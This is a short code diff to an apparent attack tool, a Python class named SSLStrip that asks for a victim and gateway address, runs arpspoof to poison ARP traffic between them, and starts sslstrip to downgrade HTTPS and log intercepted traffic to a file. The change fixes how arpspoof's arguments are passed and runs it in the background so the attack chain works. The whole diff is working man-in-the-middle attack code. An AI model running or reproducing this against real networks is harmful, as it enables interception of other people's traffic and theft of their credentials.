@@ -45,8 +45,10 @@ class SSLStrip:
 		print "\n Please enter Gateway-IP-Address (casual x.x.x.1)"
 		gateway = raw_input("IP-Address (Gateway): ")
 
+		print "Victim %s, Gateway %s" % (host, gateway)
+
 		# arp-spoofing traffic from host<->gateway
-		subprocess.call(["arpspoof", "-i "+interface, "-t "+host, gateway])
+		subprocess.Popen(["arpspoof", "-i", interface, "-t", host, gateway])
 
 		# sslstrip
 		subprocess.call(["sslstrip",  "-k", "-l 8080", "-w", "/root/Desktop/sslstrip.log"])
